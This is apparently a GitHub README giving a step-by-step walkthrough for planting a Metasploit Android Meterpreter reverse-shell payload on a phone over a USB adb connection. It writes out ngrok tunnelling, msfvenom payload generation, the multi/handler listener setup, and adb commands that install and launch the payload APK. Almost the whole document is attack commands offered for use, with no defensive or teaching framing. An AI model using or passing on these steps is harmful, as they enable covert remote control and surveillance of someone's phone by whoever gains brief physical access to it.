# adb-phone-shell
How to get phone shell with msfvenom using USB connection with adb shell

# Getting shell
// First you gotta connect the phone with USB and then in developer options enable the USB-Debugging. You can access to developer options by pressing the version number of your phone 7 times.
adb devices
![image](https://github.com/watashiwaspr/adb-phone-shell/assets/82729808/4e6dfc00-871f-4f07-90c3-0b94630e64fb)

adb shell
![image](https://github.com/watashiwaspr/adb-phone-shell/assets/82729808/6db92d1c-3466-4448-8d37-7564bc6d398e)

# Opening listener port and creating the payload

ngrok tcp 1234
![image](https://github.com/watashiwaspr/adb-phone-shell/assets/82729808/6b2dc2e8-833a-493d-b5ff-c313f816892a)

msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1234 -o payload.apk
![image](https://github.com/watashiwaspr/adb-phone-shell/assets/82729808/414ec97d-2df1-4651-9691-79ac6b9cb96f)

# Checking on multi handler

use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 1234
run
![image](https://github.com/watashiwaspr/adb-phone-shell/assets/82729808/980a5acb-e7f6-4b04-9599-e2809625e793)

# Pusing payload to the phone and downloading

adb push payload.apk /sdcard/
adb install payload.apk
adb shell am start -n com.metasploit.stage/com.metasploit.stage.MainActivity
![image](https://github.com/watashiwaspr/adb-phone-shell/assets/82729808/49b7d166-7cfd-4bb2-982a-60cbb50712c8)

